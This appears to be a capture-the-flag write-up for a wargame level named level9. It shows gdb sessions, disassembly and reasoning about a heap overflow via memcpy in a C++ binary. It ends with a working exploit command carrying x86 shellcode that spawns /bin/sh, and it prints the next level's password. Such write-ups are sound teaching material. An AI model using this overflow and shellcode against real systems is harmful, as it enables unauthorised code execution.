## Reverse

We got the bin level9 (see source.c)

There is a memcpy, so we can perform a buffer overflow

## Test the overflow

```sh
(gdb) run `python -c "print('A'*200)"`
Starting program: /home/user/level9/level9 `python -c "print('A'*200)"`

Program received signal SIGSEGV, Segmentation fault.
0x08048682 in main ()
(gdb) info registers
eax            0x41414141       1094795585
ecx            0x41414141       1094795585
edx            0x804a0d4        134521044
ebx            0x804a078        134520952
esp            0xbffff650       0xbffff650
ebp            0xbffff678       0xbffff678
esi            0x0      0
edi            0x0      0
eip            0x8048682        0x8048682 <main+142>
eflags         0x210287 [ CF PF SF IF RF ID ]
cs             0x73     115
ss             0x7b     123
ds             0x7b     123
es             0x7b     123
fs             0x0      0
gs             0x33     51
```

We seg. fault but there is a problem, we haven't overwrite `eip` but `eax` and `ecx` instead

## Check what we can do with eax an ecx

```sh
(gdb) disas main
Dump of assembler code for function main:
	0x080485f4 <+0>:     push   ebp
	0x080485f5 <+1>:     mov    ebp,esp
	0x080485f7 <+3>:     push   ebx
	0x080485f8 <+4>:     and    esp,0xfffffff0
	0x080485fb <+7>:     sub    esp,0x20
	0x080485fe <+10>:    cmp    DWORD PTR [ebp+0x8],0x1
	0x08048602 <+14>:    jg     0x8048610 <main+28>
	0x08048604 <+16>:    mov    DWORD PTR [esp],0x1
	0x0804860b <+23>:    call   0x80484f0 <_exit@plt>
	0x08048610 <+28>:    mov    DWORD PTR [esp],0x6c
	0x08048617 <+35>:    call   0x8048530 <_Znwj@plt>
	0x0804861c <+40>:    mov    ebx,eax
	0x0804861e <+42>:    mov    DWORD PTR [esp+0x4],0x5
	0x08048626 <+50>:    mov    DWORD PTR [esp],ebx
	0x08048629 <+53>:    call   0x80486f6 <_ZN1NC2Ei>
	0x0804862e <+58>:    mov    DWORD PTR [esp+0x1c],ebx
	0x08048632 <+62>:    mov    DWORD PTR [esp],0x6c
	0x08048639 <+69>:    call   0x8048530 <_Znwj@plt>
	0x0804863e <+74>:    mov    ebx,eax
	0x08048640 <+76>:    mov    DWORD PTR [esp+0x4],0x6
	0x08048648 <+84>:    mov    DWORD PTR [esp],ebx
	0x0804864b <+87>:    call   0x80486f6 <_ZN1NC2Ei>
	0x08048650 <+92>:    mov    DWORD PTR [esp+0x18],ebx
	0x08048654 <+96>:    mov    eax,DWORD PTR [esp+0x1c]
	0x08048658 <+100>:   mov    DWORD PTR [esp+0x14],eax
	0x0804865c <+104>:   mov    eax,DWORD PTR [esp+0x18]
	0x08048660 <+108>:   mov    DWORD PTR [esp+0x10],eax
	0x08048664 <+112>:   mov    eax,DWORD PTR [ebp+0xc]
	0x08048667 <+115>:   add    eax,0x4
	0x0804866a <+118>:   mov    eax,DWORD PTR [eax]
	0x0804866c <+120>:   mov    DWORD PTR [esp+0x4],eax
	0x08048670 <+124>:   mov    eax,DWORD PTR [esp+0x14]
	0x08048674 <+128>:   mov    DWORD PTR [esp],eax
	0x08048677 <+131>:   call   0x804870e <_ZN1N13setAnnotationEPc>
	0x0804867c <+136>:   mov    eax,DWORD PTR [esp+0x10]
	0x08048680 <+140>:   mov    eax,DWORD PTR [eax]
	=> 0x08048682 <+142>:   mov    edx,DWORD PTR [eax]
	0x08048684 <+144>:   mov    eax,DWORD PTR [esp+0x14]
	0x08048688 <+148>:   mov    DWORD PTR [esp+0x4],eax
	0x0804868c <+152>:   mov    eax,DWORD PTR [esp+0x10]
	0x08048690 <+156>:   mov    DWORD PTR [esp],eax
	0x08048693 <+159>:   call   edx
	0x08048695 <+161>:   mov    ebx,DWORD PTR [ebp-0x4]
	0x08048698 <+164>:   leave
	0x08048699 <+165>:   ret
End of assembler dump.
```

We see that we seg fault at `0x08048682` because we try to 	`dereference eax` that have been overwrite and is equal to `0x41414141`

So we can do some think with `eax`

### Check the value of eax

```sh
Starting program: /home/user/level9/level9 $(python -c "print 'BBBB' + 'A' * 104 + 'AAAA'") $(python -c "print '\x90'*1000 + '\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80'")

Breakpoint 1, 0x0804867c in main ()
(gdb) info registers
eax            0x804a00c        134520844
ecx            0x41414141       1094795585
edx            0x804a07c        134520956
ebx            0x804a078        134520952
esp            0xbffff280       0xbffff280
ebp            0xbffff2a8       0xbffff2a8
esi            0x0      0
edi            0x0      0
eip            0x804867c        0x804867c <main+136>
eflags         0x200283 [ CF SF IF ID ]
cs             0x73     115
ss             0x7b     123
ds             0x7b     123
es             0x7b     123
fs             0x0      0
gs             0x33     51
(gdb) x 0x804a00c
0x804a00c:      0x42424242
```

### Check the instructions of eax
```sh
	0x0804867c <+136>:   mov    eax,DWORD PTR [esp+0x10] # eax is the av[1] + offset 0
	0x08048680 <+140>:   mov    eax,DWORD PTR [eax] # eax is the av[1] + offset 108
	0x08048682 <+142>:   mov    edx,DWORD PTR [eax] # set the value of eax in edx
	0x08048684 <+144>:   mov    eax,DWORD PTR [esp+0x14]
	0x08048688 <+148>:   mov    DWORD PTR [esp+0x4],eax
	0x0804868c <+152>:   mov    eax,DWORD PTR [esp+0x10]
	0x08048690 <+156>:   mov    DWORD PTR [esp],eax
	0x08048693 <+159>:   call   edx # call edx so the value of eax
``` 

We set `av[1] + offset 0` at `0xbffff8c4`, the address of `av[2]`

and `av[1] + offset 108` at `0x0804a00c`, the value of `eax` which is the first `eax` (av[2] + offset 0)

So at the call of `edx` at `0x08048693`

- edx == 2nd eax == av[1] + 108 == 1st eax
- call edx == call the value of av[1] + 108 == call eax == value of av[2]

So at the call of the 2nd eax at `0x08048693`, that as been transfered to edx, will call the value of the shellcode `\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80` in av[2] that will be executed

## Exploit

```sh
./level9 $(python -c "print '\xc4\xf8\xff\xbf' + 'A' * 104 + '\x0c\xa0\x04\x08'") $(python -c "print '\x90'*1000 + '\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80'")
$ cat /home/user/bonus0/.pass
f3f0004b6f364cb5a4147e9ef827fa922a4861408845c26b6971ad770d906728
```
